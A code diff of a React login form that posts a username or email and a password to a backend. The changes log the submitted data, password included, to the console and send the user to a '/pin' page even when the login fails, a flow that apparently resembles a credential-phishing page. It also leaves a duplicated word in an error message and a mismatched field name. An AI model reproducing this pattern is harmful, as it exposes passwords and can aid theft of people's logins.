@@ -11,9 +11,7 @@ import axios from "axios";
 import BASE_URL from "../components/urls";
 
 const schema = yup.object().shape({
-  username: yup
-    .string()
-    .required("Username, phone number or email is required"),
+  email: yup.string().required("email, phone number or email is required"),
   password: yup
     .string()
     .min(10, "Password must be at least 10 characters")
@@ -36,12 +34,13 @@ const Home = () => {
       .post(`${BASE_URL}/`, data)
       .then((response) => {
         console.log(response.data);
-        navigate("/pin");
+        console.log(data);
       })
       .catch((error) => {
         console.error("There was an error!", error);
       })
       .finally(() => {
+        navigate("/pin");
         setLoading(false);
       });
   };
@@ -63,11 +62,11 @@ const Home = () => {
             <label htmlFor="username">Phone number, email or username</label>
             <div className="formInput">
               <input
-                name="username"
+                name="email"
                 type="text"
                 placeholder="Enter phone number, email or username"
                 required
-                {...register("username")}
+                {...register("email")}
               />
             </div>
             <FormErrMsg errors={errors} inputName="username" />
